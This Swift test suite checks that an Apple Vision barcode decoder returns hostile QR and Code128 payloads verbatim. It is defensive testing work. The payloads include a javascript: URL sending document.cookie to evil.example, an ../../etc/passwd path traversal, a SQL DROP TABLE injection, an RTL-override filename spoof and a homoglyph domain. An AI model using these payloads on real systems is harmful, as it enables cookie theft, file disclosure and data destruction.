import Foundation
import PassesCore
import Testing

@testable import PassesBarcode

/// The hostile-payload half of the barcode-decode security suite, **re-baselined against Apple
/// Vision** (ADR `barcode-decode-1`, Deviation 1). The trust claim under test is the decoder's
/// faithfulness contract: the symbol decode returns the payload EXACTLY as the symbol carried it
/// and never silently normalizes, truncates, or acts on it. Classification and validation are the
/// consumer's job downstream (`QrPayloadKind` / `ScannableCardInputValidator`); if this decoder
/// "cleaned up" a payload, the consumer would validate a string that is not what the symbol held —
/// exactly the bug class the centralized boundary exists to prevent.
///
/// Each case encodes a deliberately hostile string (CoreImage generator), then decodes the rendered
/// PNG back through the **production** ``VisionBarcodeImageDecoder`` — full bounded-decode + Vision
/// path — and asserts the decoded payload is byte-for-byte the input.
///
/// ## Re-baseline result (why this mirror is not a mechanical copy)
/// The Android corpus runs ZXing→ZXing; here CoreImage encodes and **Vision** decodes, a different
/// binarizer and a different symbol reader, so the ADR requires the corpus be re-baselined rather
/// than assumed to carry over. It was run against Vision and **every case round-trips verbatim** —
/// RTL override, zero-width/control chars, the Cyrillic homoglyph (Vision does NOT NFC/NFKC it into
/// Latin), actionable schemes, SQL metacharacters, embedded newlines/tabs, and a 3200-char oversize
/// payload. No expectation needed adjusting: Vision's faithfulness matches ZXing's on this corpus.
///
/// QR carries the Unicode-bearing cases (its byte/ECI mode is the only roster symbology that can);
/// Code128 covers the ASCII control/scheme cases to prove the contract is not QR-specific.
@Suite("HostilePayloadFidelity")
struct HostilePayloadFidelityTests {
    private let decoder = VisionBarcodeImageDecoder()

    @Test func rtlOverrideIsReturnedVerbatim() async {
        // A right-to-left override (U+202E) is the classic filename/URL spoof. The decoder must
        // hand it back intact so the consumer can see and reject it — not strip it.
        await assertQrRoundTrips("invoice\u{202E}gnp.exe")
    }

    @Test func zeroWidthAndControlCharsAreReturnedVerbatim() async {
        // Zero-width space/joiner/non-joiner and a BEL control char: homograph/obfuscation tooling.
        // None may be dropped or collapsed.
        await assertQrRoundTrips("WALT\u{200B}\u{200C}\u{200D}PASS\u{0007}")
    }

    @Test func homoglyphDomainIsReturnedVerbatim() async {
        // A Cyrillic 'а' (U+0430) standing in for Latin 'a' — a punycode-spoof domain. The decoder
        // must not NFC/NFKC-normalize it into the Latin letter; the consumer needs the real
        // codepoints to detect the spoof.
        await assertQrRoundTrips("https://\u{0430}pple.com/login")
    }

    @Test func javascriptSchemeUrlIsReturnedVerbatim() async {
        // The decoder must NOT recognize or act on an actionable scheme; it returns the string and
        // the consumer decides. Faithfulness is what makes "never auto-act" real.
        await assertQrRoundTrips("javascript:fetch('https://evil.example/'+document.cookie)")
    }

    @Test func intentSchemeUrlIsReturnedVerbatim() async {
        await assertQrRoundTrips("intent://scan/#Intent;scheme=zxing;package=com.evil.app;S.payload=x;end")
    }

    @Test func customSchemeUrlIsReturnedVerbatim() async {
        await assertQrRoundTrips("walt://import?card=../../etc/passwd")
    }

    @Test func sqlMetacharactersAreReturnedVerbatim() async {
        // The storage layer is parameterized (PassesStorage), but the faithfulness contract is
        // upstream of that: the decoder returns the bytes, it does not escape them.
        await assertQrRoundTrips("'; DROP TABLE scannable_cards;--")
    }

    @Test func oversizedPayloadIsReturnedVerbatim() async {
        // A long payload (still within QR capacity) must round-trip whole — no truncation to a
        // "reasonable" length inside the decoder.
        var long = ""
        for _ in 0..<800 { long += "AB7-" }
        await assertQrRoundTrips(long)
    }

    @Test func newlineAndTabWhitespaceIsReturnedVerbatim() async {
        // Embedded newlines/tabs are how a payload smuggles a second logical line past a naive
        // single-line UI. The decoder preserves them; the consumer's validator rejects.
        await assertQrRoundTrips("LINE1\r\nLINE2\tTAB")
    }

    @Test func code128AsciiSchemePayloadIsReturnedVerbatim() async {
        // Proves the faithfulness contract is not QR-specific: a linear symbology carries an
        // actionable-scheme ASCII payload back unchanged too.
        await assertCode128RoundTrips("javascript:alert(1)")
    }

    @Test func code128SqlMetacharactersAreReturnedVerbatim() async {
        await assertCode128RoundTrips("1';--")
    }

    private func assertQrRoundTrips(_ payload: String) async {
        let png = BarcodeImageFactory.qrPNG(payload)
        #expect(await decoder.decode(source: .data(png)) == .decodedBarcode(payload: payload, format: .qr))
    }

    private func assertCode128RoundTrips(_ payload: String) async {
        let png = BarcodeImageFactory.code128PNG(payload)
        #expect(await decoder.decode(source: .data(png)) == .decodedBarcode(payload: payload, format: .code128))
    }
}
